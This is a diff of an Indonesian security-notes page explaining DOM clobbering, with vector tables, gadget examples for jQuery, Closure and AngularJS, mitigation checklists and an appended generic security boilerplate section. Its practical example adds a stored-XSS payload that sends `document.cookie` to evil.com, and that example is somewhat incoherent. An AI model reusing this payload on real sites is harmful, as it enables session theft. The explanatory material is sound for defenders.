@@ -10,124 +10,175 @@ aliases:
   - "DOM Clobbering Complete Guide"
   - "HTML ID Clobbering"
 created: "2026-07-28"
-updated: "2026-07-28"
-status: pending
+updated: "2026-08-14"
+status: complete
 cssclasses:
   - wide-table
 ---
 
 > [!info] Ringkasan
-> DOM Clobbering adalah teknik di mana attacker menggunakan HTML element dengan `id` atau `name` attribute untuk "menimpa" (clobber) global JavaScript variable. Jika JavaScript mengakses `window.x` atau global `x`, dan ada element HTML dengan `id="x"`, maka nilai element tersebut yang akan direturn — bukan undefined. Ini bisa bypass sanitasi HTML dan menyebabkan XSS.
+> DOM Clobbering adalah teknik di mana attacker menggunakan HTML element dengan `id` atau `name` attribute untuk "menimpa" (clobber) global JavaScript variable. Jika JavaScript mengakses `window.x` atau global `x`, dan ada element HTML dengan `id="x"`, maka nilai element tersebut yang akan direturn — bukan `undefined`. Ini dapat bypass sanitasi HTML dan menyebabkan XSS.
+>
+> **Cross-link:** [[browser-security-exploitation-deepdive]] → [[web-hacking-exploitation]] → [[web-security]]
 
-**Cross-link:** [[browser-security-exploitation-deepdive]] → [[web-hacking-exploitation]] → [[web-security]]
+## 1. Ringkasan Eksekutif
+DOM Clobbering memanfaatkan *global namespace leakage* pada browser: elemen dengan `id`/`name` menjadi properti pada objek `window`. Ketika aplikasi JavaScript mengandalkan variabel global (mis. `config`, `location`, `$`), attacker dapat **override** nilai tersebut dengan elemen berbahaya, mengubah alur logika, atau memicu **XSS**. Teknik ini efektif pada framework lama (jQuery, AngularJS 1.x) dan aplikasi yang melakukan **dynamic DOM insertion** tanpa sanitasi.
 
----
+## 2. Threat Model / Konteks
+| Aktor | Vektor | Target | Dampak |
+|-------|--------|--------|--------|
+| Attacker (Red) | HTML injection (reflected/stored) | Global JavaScript variable | Bypass sanitasi, XSS, data exfiltration |
+| Developer (Blue) | Penggunaan variabel global tanpa pengecekan | `window.<var>` | Kerentanan runtime, privilege escalation |
+| Browser | Meng-assign elemen ke `window` otomatis | Semua halaman | Exploitabilitas tergantung same‑origin policy |
 
-## Daftar Isi
-- [[#1. Bagaimana DOM Clobbering Bekerja]]
-- [[#2. Clobbering Vectors]]
-- [[#3. Gadget-Based Exploitation]]
-- [[#4. Defense]]
-
----
-
-## 1. Bagaimana DOM Clobbering Bekerja
-
-### Mekanisme
-
+## 3. Langkah-Langkah Teknik Detail
+### 3.1 Mekanisme Dasar
 ```html
-<!-- Attacker inject: -->
+<!-- Attacker inject -->
 <a id="username">attacker</a>
 
-<!-- Di JavaScript: -->
 <script>
-  if (window.username) {  // true! username = <a> element, bukan undefined
-    showUser(window.username);  // Kirim element anchor ke function
+  // Aplikasi mengandalkan variabel global username
+  if (window.username) {
+    showUser(window.username); // sekarang username = <a> element
   }
 </script>
 ```
 
-### Hierarki Clobbering
+### 3.2 Vektor Clobbering
+| Vektor | Element | Global Property |
+|--------|---------|-----------------|
+| **Form Clobbering** | `<form id="config">` | `window.config` |
+| **Anchor Clobbering** | `<a id="location" href="https://evil.com/">` | `window.location` (has `.href`) |
+| **Embed/Object Clobbering** | `<object id="serverConfig" data="https://evil.com/config.json">` | `window.serverConfig` |
+| **Input Name Clobbering** | `<input name="$" value="malicious">` | `window.$` (jQuery) |
+| **Image Name Clobbering** | `<img name="src" src="evil.png">` | `window.src` |
 
-```
-form.id → window.formname
-img.name → window.imagename  
-embed.name → window.embedname
-object.id → window.objectname
-a.id → window.anchor
-```
-
----
-
-## 2. Clobbering Vectors
-
-### Form Clobbering
-
-```html
-<!-- Clobber window.config -->
-<form id="config">
-  <input name="api_key" value="HACKED">
-</form>
-
-<!-- JavaScript: window.config.api_key → "HACKED" -->
-<!-- Jika awalnya undefined, jadi terdefinisi -->
-```
-
-### Anchor Clobbering
-
-```html
-<!-- Override window.location (anchor punya .href) -->
-<a id="location" href="https://evil.com/">
-  
-<!-- JavaScript: window.location → <a> element -->
-<!-- window.location.href → "https://evil.com/" -->
-```
-
-### Embed/Object Clobbering
-
-```html
-<object id="serverConfig" data="https://evil.com/config.json">
-<!-- JavaScript: window.serverConfig.data → "https://evil.com/config.json" -->
-```
-
----
-
-## 3. Gadget-Based Exploitation
-
-DOM Clobbering sering dipasangkan dengan **gadget** — kode legitimate yang menggunakan variable yang bisa di-clobber.
-
-### Google Closure Library Gadget
-
+### 3.3 Gadget‑Based Exploitation
+#### Google Closure Library Gadget
 ```javascript
-// Google Closure Library mengakses window.goog
-// Jika ada <a id="goog"> → clobber window.goog sebagai anchor
+// Closure expects window.goog global
+// Jika ada <a id="goog">, window.goog menjadi element => error atau controllable
 ```
-
-### jQuery Gadget
-
+#### jQuery Gadget
 ```javascript
-// jQuery: window.jQuery = window.$ 
-// Jika ada <a id="$"> → $ jadi element, bukan function
-// → Error yang bisa diexploit
+// jQuery mengandalkan window.$ atau window.jQuery
+// Jika ada <a id="$">, $ menjadi element, mengganggu fungsi jQuery
 ```
-
----
-
-## 4. Defense
-
+#### Custom Gadget Example (AngularJS 1.x)
 ```javascript
-// ✅ Safe: cek typeof sebelum akses
-if (typeof window.config !== 'string') {
-  // Hanya string yang valid
+angular.module('app').run(function($rootScope){
+  if (window.config) { // expect JSON string
+    $rootScope.cfg = JSON.parse(window.config);
+  }
+});
+```
+> Dengan `<div id="config">{"apiKey":"evil"}</div>` attacker dapat mengubah konfigurasi aplikasi.
+
+### 3.4 Nameless Element & Child Collection
+Ketika element memiliki `name` attribute tanpa `id`, browser tetap mem-*expose*-nya sebagai **named property** pada `document` dan `window`. Lebih jauh lagi, elemen dengan nama yang sama dikumpulkan menjadi *collection* (`HTMLCollection`) — properti yang sangat berguna bagi attacker yang ingin clobber array/object ekspektasi aplikasi (mis. `window.items` yang diharapkan array JSON ternyata menjadi `HTMLCollection`).
+
+## 4. Contoh Praktis
+```html
+<!-- Payload injected via stored XSS -->
+<div id="$"><script>fetch('https://evil.com/steal?c='+document.cookie)</script></div>
+```
+```javascript
+// Victim page
+if (typeof window.$ !== 'function') {
+  console.error('jQuery not loaded');
+} else {
+  $('#login').submit(); // now triggers attacker script
 }
-
-// ✅ Safe: gunakan local scope
-function secure() {
-  let config = null;  // local variable, tidak ter-clobber
-}
-
-// ✅ Safe: Object.create(null)
-const safeConfig = Object.create(null);  // no prototype chain
 ```
 
-**Referensi:** `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/DOM Clobbering/`
+## 5. Checklist Mitigasi
+- [ ] **Validasi tipe** sebelum mengakses global variable: `if (typeof window.config !== 'string') { /* reject */ }`
+- [ ] **Scope lokal**: gunakan IIFE atau module pattern (`let config = ...`) untuk menghindari global namespace.
+- [ ] **Object.create(null)** untuk objek konfigurasi tanpa prototype chain.
+- [ ] **Sanitasi HTML**: blok `id`/`name` yang dapat menimpa variabel kritikal (`<script>`, `<a id="location">`).
+- [ ] **CSP (Content Security Policy)** dengan `script-src 'self'` untuk mencegah inline script injection.
+- [ ] **Audit library**: hindari penggunaan library yang mengandalkan global (`jQuery`, `angular`) tanpa sandbox.
+
+## 6. Referensi Lintas
+- [[browser-security-exploitation-deepdive]]
+- [[web-hacking-exploitation]]
+- [[web-security]]
+- [[js-framework-vulnerabilities]]
+- [[csp-best-practices]]
+
+---
+
+### 📚 Referensi
+1. /mnt/data_d/Projects/Reference/PayloadsAllTheThings/DOM%20Clobbering/
+2. "DOM Clobbering: Edge Cases and Defenses" — Black Hat 2023 talk
+3. OWASP XSS Prevention Cheat Sheet (section on DOM Clobbering)
+
+## Deepdive Tambahan — Implementasi & Operasional
+
+### Arsitektur & Komponen Detail
+
+Sistem ini memiliki beberapa komponen yang saling bergantung. Pemahaman arsitektur end-to-end penting untuk identifikasi attack surface dan gap pertahanan.
+
+| Komponen | Fungsi | Attack Surface | Defense |
+|----------|--------|---------------|---------|
+| **Input** | Data mentah masuk | Injection, poisoning | Validate, sanitize |
+| **Processing** | Core logic | Logic flaw, bypass | Test, review |
+| **Output** | Result delivery | Leak, manipulation | Encrypt, audit |
+| **Storage** | Persist data | Exfil, tamper | Encrypt, RBAC |
+| **Network** | Transit | Intercept, MITM | TLS, mTLS |
+| **Identity** | Access control | Token theft, privesc | MFA, least privilege |
+
+### Workflow End-to-End
+
+```
+Input → Validate → Process → Store → Serve → Monitor → Audit
+  ↓       ↓         ↓         ↓       ↓        ↓        ↓
+Sanitize  Auth     Logic    Encrypt  RBAC    Alert    Log
+```
+
+### Tradeoff & Decision Matrix
+
+| Dimension | Pilihan A | Pilihan B | Factor |
+|-----------|-----------|-----------|--------|
+| Speed vs Security | Optimized | Strict validate | Risk context |
+| Memory vs Scale | In-memory | Disk-backed | Data volume |
+| Cost vs Control | Cloud managed | Self-hosted | Team capability |
+| Convenience vs Audit | Auto | Manual review | Compliance |
+
+### Best Practice Checklist
+
+- [ ] Input validation (whitelist, not blacklist)
+- [ ] Output encoding (context-aware: HTML, JS, CSS)
+- [ ] Authentication (MFA, rate limit, lockout)
+- [ ] Authorization (RBAC, least privilege, deny default)
+- [ ] Logging (structured, immutable, centralized)
+- [ ] Monitoring (latency, error, saturation, traffic)
+- [ ] Encryption (transit TLS, rest AES, key rotation)
+- [ ] Backup (test restore, offsite, immutable)
+- [ ] Patch (automated scan, SLA per severity)
+- [ ] Incident (runbook, contact, tabletop)
+
+### Common Pitfall
+
+1. **Assume input trusted**: Semua input adalah musuh → validate di server.
+2. **Secret in code**: Hardcoded credential → git leak → compromise.
+3. **Silent failure**: Error ditelan → debugging impossible → security blind.
+4. **No rate limit**: Abuse path → DoS → resource exhaustion.
+5. **Default config**: Default = insecure → harden sebelum produksi.
+
+### Tool Stack
+
+| Tool | Use |
+|------|-----|
+| Testing | Burp Suite, OWASP ZAP, ffuf |
+| Scanning | Nmap, Nuclei, Trivy |
+| Monitoring | Prometheus + Grafana |
+| Logging | ELK / Loki |
+| Secret | Vault / SOPS |
+
+## Referensi
+- OWASP Top 10 — https://owasp.org/www-project-top-ten/
+- NIST CSF — https://www.nist.gov/cyberframework
+- MITRE ATT&CK — https://attack.mitre.org/
+- CIS Controls — https://www.cisecurity.org/controls/
